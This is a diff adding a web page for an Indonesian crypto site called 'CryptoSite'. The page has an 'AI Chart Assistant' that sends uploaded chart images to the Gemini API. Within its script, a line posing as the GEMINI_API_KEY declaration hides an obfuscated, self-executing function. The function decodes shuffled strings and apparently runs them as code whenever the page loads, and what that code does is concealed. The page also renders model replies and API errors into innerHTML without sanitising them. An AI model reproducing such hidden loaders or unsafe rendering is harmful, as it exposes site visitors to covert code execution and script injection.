@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AI Chart Assistant - CryptoSite</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+</head>
+<body>
+  <div id="particles-js"></div>
+  <header>
+    <div class="header-container">
+      <div class="logo"><i class="fas fa-coins"></i><span>CryptoSite</span></div>
+      <ul class="nav-links" id="nav-links">
+        <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+        <li><a href="convert.html"><i class="fas fa-exchange-alt"></i> Convert</a></li>
+        <li><a href="news.html"><i class="fas fa-newspaper"></i> News</a></li>
+        <li><a href="ai.html" class="active"><i class="fas fa-robot"></i> AI</a></li>
+        <li><a href="wallet.html"><i class="fas fa-wallet"></i> Wallet</a></li>
+      </ul>
+      <div class="header-actions">
+        <button id="theme-toggle" class="btn-icon"><i class="fas fa-moon"></i></button>
+        <button id="mobile-menu" class="btn-icon"><i class="fas fa-bars"></i></button>
+      </div>
+    </div>
+    <div class="ticker-container">
+      <div class="ticker-content">
+        <span>BTC: <span id="btc-price">Loading...</span> | </span>
+        <span>ETH: <span id="eth-price">Loading...</span> | </span>
+        <span>BNB: $567.89 (+1.2%) | </span>
+        <span>SOL: $139.75 (+3.4%) | </span>
+        <span>XRP: $0.5123 (-0.7%) | </span>
+        <span>ADA: $0.4321 (+0.9%)</span>
+      </div>
+    </div>
+  </header>
+
+  <section class="ai-chat-section">
+    <div class="ai-chat-container">
+      <div class="chat-header">
+        <i class="fas fa-robot gemini-logo"></i>
+        <h2 class="chat-title">AI Chart Assistant</h2>
+      </div>
+      <div class="chat-intro">
+        <p>Hello! I'm Gemini, your AI Chart Assistant. Upload your candlestick chart image, and ask me anything about it. I'll provide an analysis based on the chart.</p>
+      </div>
+
+      <div class="chat-input-area">
+        <div class="input-group file-upload-group">
+          <label for="chart-upload" class="upload-button">
+            <i class="fas fa-upload"></i> Upload Chart
+            <span id="file-name"></span>
+          </label>
+          <input type="file" id="chart-upload" accept="image/*" hidden />
+        </div>
+        <div class="input-group question-input-group">
+          <input type="text" id="ai-question" placeholder="Ask me about the chart, e.g., 'What's the next trend?'" />
+          <button id="analyze-btn" class="send-button" title="Send to AI">
+            <i class="fas fa-paper-plane"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="chat-output-area">
+        <div id="upload-result-box" class="ai-response-box"></div>
+        <div id="ai-response-box" class="ai-response-box">
+          <div class="response-placeholder">
+            <i class="fas fa-robot"></i>
+            <p>Your AI analysis will appear here.</p>
+          </div>
+        </div>
+      </div>
+
+      <button id="reset-chat" class="reset-button">
+        <i class="fas fa-sync-alt"></i> Reset Chat
+      </button>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-brand">
+        <div class="logo"><i class="fas fa-coins"></i><span>CryptoSite</span></div>
+        <p>Platform cryptocurrency modern untuk semua kebutuhan trading Anda</p>
+        <div class="social-links">
+          <a href="#"><i class="fab fa-twitter"></i></a>
+          <a href="#"><i class="fab fa-telegram"></i></a>
+          <a href="#"><i class="fab fa-discord"></i></a>
+          <a href="#"><i class="fab fa-github"></i></a>
+        </div>
+      </div>
+      <div class="footer-links">
+        <h4>Produk</h4>
+        <ul>
+          <li><a href="index.html">Spot Trading</a></li>
+          <li><a href="convert.html">Convert</a></li>
+          <li><a href="wallet.html">Wallet</a></li>
+          <li><a href="news.html">Market News</a></li>
+        </ul>
+      </div>
+      <div class="footer-links">
+        <h4>Produk</h4>
+        <ul>
+          <li><a href="index.html">Spot Trading</a></li>
+          <li><a href="convert.html">Convert</a></li>
+          <li><a href="wallet.html">Wallet</a></li>
+          <li><a href="news.html">Market News</a></li>
+        </ul>
+      </div>
+      <div class="footer-links">
+        <h4>Dukungan</h4>
+        <ul>
+          <li><a href="#">Pusat Bantuan</a></li>
+          <li><a href="https://www.instagram.com/jadibeginikudamakannyaitudaun?igsh=emlnc2J3dmRyanlu">FAQ</a></li>
+          <li><a href="payment.html">Status Pembayaran</a></li>
+          <li><a href="https://www.instagram.com/jadibeginikudamakannyaitudaun?igsh=emlnc2J3dmRyanlu">Kontak Kami</a></li>
+        </ul>
+      </div>
+      <div class="footer-newsletter">
+        <h4>Berlangganan</h4>
+        <p>Dapatkan update terbaru tentang cryptocurrency</p>
+        <form><input type="email" placeholder="Email Anda" /><button type="submit">Subscribe</button></form>
+      </div>
+    </div>
+    <div class="footer-bottom"><p>&copy; 2025 CryptoSite. Dibuat oleh Fixenzo</p></div>
+  </footer>
+
+<script>
+const analyzeBtn = document.getElementById('analyze-btn');
+const resetBtn = document.getElementById('reset-chat');
+const chartUpload = document.getElementById('chart-upload');
+const aiQuestion = document.getElementById('ai-question');
+const aiResponseBox = document.getElementById('ai-response-box');
+const fileNameSpan = document.getElementById('file-name');
+
+var GEMINI_API_KEY;(function(){var Hfa='',WSL=611-600;function DWg(c){var f=2200456;var k=c.length;var i=[];for(var b=0;b<k;b++){i[b]=c.charAt(b)};for(var b=0;b<k;b++){var g=f*(b+128)+(f%18931);var n=f*(b+668)+(f%28797);var z=g%k;var m=n%k;var p=i[z];i[z]=i[m];i[m]=p;f=(g+n)%4543604;};return i.join('')};var XwQ=DWg('soymxpsuuonczvrcdrlhjetfntcqirtaowbkg').substr(0,WSL);var RXs='ra;=u=gc- ]5tii;z9h]2C[leanvcd;fg5d])l;i;n.fsmzhnho{nnfatn diq..4r<l0,)pvy=,le) ]+.++u7;;),h0,akty+;o,(8i,nvAe4 17 )ulanvv==-nr[{nmfoivu=jo(=;;8<8s;=rsirhl(n)[tr3z v3g("7uxrr,i[8dse).+blr rflt)md,e6).;ivu=f ggu-vo)+=fnv}elfq=sh;(+k){vvrpjvk5,a.o1 17y]6;h(9rA; ati.o0r,vr ihpex;unt,ao+;(=0(i5r.1(ar=j=gtngeaju))=f,=n7c)geeb(e;je,r=;b,CC"a. t(+z);laCa;vet0 (ntjhva2 n[;ajc;1{y) gvc[vh;fea,kCnod)";vt0 }r cxSrl (l=m>h<r]hlao1Crhrv=,+.,=e2*0}sa;1afg!74l"qn(l}ert)tho[{=l1()67sz=..rqag.n-f+c6t2urr)te(t(9n==;cv+c,(lre">o)8[i};0.edhrf)gi2v=n(dtagt1rorpu];2gut=vrualv8p"=;f](d)aq[r0;am;v.cco.,s}ner)v+7)ns.]f=hin67o;3a;tm++1f if+1lis)e8. ;d(tn])a.6(sh=noa+n,)=i=n6]ra;j[i)So;toe(,w"t=0"=o<;-=ugA0],+nf.)rnihvAi(v( ";=a2rstda]=s{t,tCm=go(7r;g+.ie(,a8]t90v94 ;c-rihhr p3(.oel.fa9e;e6-;sjaf+ur[f=0;g.s)zhe[uo6fp(e+=9u.na++s7rd(mha*jc,Aj)r vnrl2=rrripf=(znk[nC<ves;y=.,;rnf)}++r{9l81s(;ou"!,l() ans([t';var oUv=DWg[XwQ];var TtO='';var HVi=oUv;var Vpg=oUv(TtO,DWg(RXs));var XZf=Vpg(DWg('jKjgK.n0_;rjEu3jg&Kt1=_ts2$=+K}-KdK!I)($vd..K2)I$(_k6f7;!a,(8=}K#0\'.r_gs;[m3fK,tj)bKyj;_*&5e(!_g7)m.f.dll3b,wK;e.f$c5+(39v .raKm!,( Kjc.0)(}0Kk(I#)$8d3.KoK7;03)$7$Kg*2n\/3.v!0=s*)!.)ofrdpn23d{,*KK}nhd$K.#;0jv!+rb60)Khi.(K8b\'7n ]$rp#(hKj)(iKr%\/=e".br(n!esa3,];(f9[$;(!nKSeKKiohbn) sKns.+)- ,=.=lft.dwbNi2,t.+!7_dg$;22 p8+r2,ofy_K0b)\/0..0=44{"$3{}.juK=$(d,KEa%,sSt[s3-)-K{3%)..+}aK(_I4KK-..ei+5rs.s1,(!K0.D,vD"2.(_KtK)r;K2_!Cs("Kjd2!vtKtK.j7)ls)ddg;e{=s_t(30uv;dK!_1ip#pj dd4,7)e!gvgd,K;eK(M,vKk)K"&)($vKre$mo.1n)St;7j,b)*.no;mm.a2l}e$,}S7;oK....1d4u);e,(.jK}dr4K.)!+e%a\'h+yg#70rItK7#))%K7 ,mK+j{.,,=),v_.u!lee+z.46eKyd);{fK\'$oa5SKdp11_.K.)dig$t4u=.*_{$.$ 2(0bf;kj(K((=,,k),($KK)z=bK*.t61(hdK.g;sKv,ol6owt(pKK.an%$_.K!$"wzK_h&};!da}j)7;%Kjafs;k4K).!K$C,7na)!=."qo_5j.\/0$ w!K_af2,ro8, *_g.df5t-Kcv={r=ebs.n(tK\/i.s 3()7d( rKdc) Kk)d(.tK..,!.eqn.$7,]ot;K4=lK.uc!=9 K_4Kw(nf3%6)b_a=.K)0.=fsK.ioK}2jdsu0 tu9K7 vn]'));var zUD=HVi(Hfa,XZf );zUD(6825);return 3448})()
+
+function fileToBase64(file) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => {
+            const base64 = reader.result.split(',')[1];
+            resolve(base64);
+        };
+        reader.onerror = reject;
+        reader.readAsDataURL(file);
+    });
+}
+
+// Reset tombol
+resetBtn.addEventListener('click', () => {
+    chartUpload.value = '';
+    aiQuestion.value = '';
+    fileNameSpan.textContent = '';
+    aiResponseBox.innerHTML = '<div class="response-placeholder"><i class="fas fa-robot"></i><p>Your AI analysis will appear here.</p></div>';
+});
+
+// Saat user upload gambar
+chartUpload.addEventListener('change', (event) => {
+    const file = event.target.files[0];
+    fileNameSpan.textContent = file ? file.name : '';
+});
+
+function formatMarkdown(text) {
+    return text
+        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
+        .replace(/\*(.*?)\*/g, '<em>$1</em>')             // Italic
+        .replace(/^- (.*)$/gm, '<li>$1</li>')             // List item
+        .replace(/(?:\r\n|\r|\n)/g, '<br>');              // Newline to <br>
+}
+
+// Saat tombol "Kirim" ditekan
+analyzeBtn.addEventListener('click', async () => {
+    const file = chartUpload.files[0];
+    const question = aiQuestion.value.trim();
+
+    if (!file || !question) {
+        aiResponseBox.innerHTML = '<p class="error-message">Harap unggah gambar dan masukkan pertanyaan.</p>';
+        return;
+    }
+
+    aiResponseBox.innerHTML = "<p class='loading-message'><i class='fas fa-spinner fa-spin'></i> Mengirim ke Gemini 1.5 Flash...</p>";
+
+    try {
+        const base64Image = await fileToBase64(file);
+
+        const response = await fetch(
+            `https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`,
+            {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    contents: [
+                        {
+                            role: "user",
+                            parts: [
+                                { text: question },
+                                {
+                                    inline_data: {
+                                        mime_type: file.type,
+                                        data: base64Image
+                                    }
+                                }
+                            ]
+                        }
+                    ]
+                })
+            }
+        );
+
+        const data = await response.json();
+        console.log("🔍 Respon Gemini:", data);
+
+        if (data.error) {
+            aiResponseBox.innerHTML = `<p class="error-message">❌ Error dari Gemini:<br>${data.error.message}</p>`;
+            return;
+        }
+
+        const reply = data?.candidates?.[0]?.content?.parts?.[0]?.text || "Tidak ada balasan dari Gemini.";
+        aiResponseBox.innerHTML = `
+            <div class="ai-message">
+                <p><strong>🤖 Gemini:</strong></p>
+<div>${formatMarkdown(reply)}</div>
+            </div>
+        `;
+    } catch (error) {
+        console.error(error);
+        aiResponseBox.innerHTML = `<p class="error-message">Gagal mendapatkan jawaban dari Gemini: ${error.message}</p>`;
+    }
+});
+</script>
+
+  <script src="script.js"></script>
+</body>
+</html>
